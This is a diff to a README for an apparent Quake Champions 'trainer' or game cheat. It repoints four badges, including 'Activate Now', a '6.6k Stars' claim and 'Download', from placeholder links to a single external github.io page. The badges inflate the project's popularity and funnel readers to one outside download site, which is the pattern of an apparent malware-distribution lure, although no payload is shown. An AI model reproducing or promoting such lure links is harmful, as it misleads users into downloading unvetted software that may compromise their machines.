@@ -11,10 +11,10 @@ Quake Champions thrives on movement and lightning-fast reaction times. This trai
 \[!IMPORTANT]
 This trainer is for **offline training and practice** only. Online competitive use is not supported.
 
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-red?style=for-the-badge\&logo=rocket)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 6.6k Stars](https://img.shields.io/badge/⭐️%206.6k-Stars-yellow?style=for-the-badge\&logo=github)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](#)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-red?style=for-the-badge\&logo=rocket)](https://quake-champions-aim-precision.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](https://quake-champions-aim-precision.github.io/.github/)
+[![⭐️ 6.6k Stars](https://img.shields.io/badge/⭐️%206.6k-Stars-yellow?style=for-the-badge\&logo=github)](https://quake-champions-aim-precision.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](https://quake-champions-aim-precision.github.io/.github/)
 
 ---
 
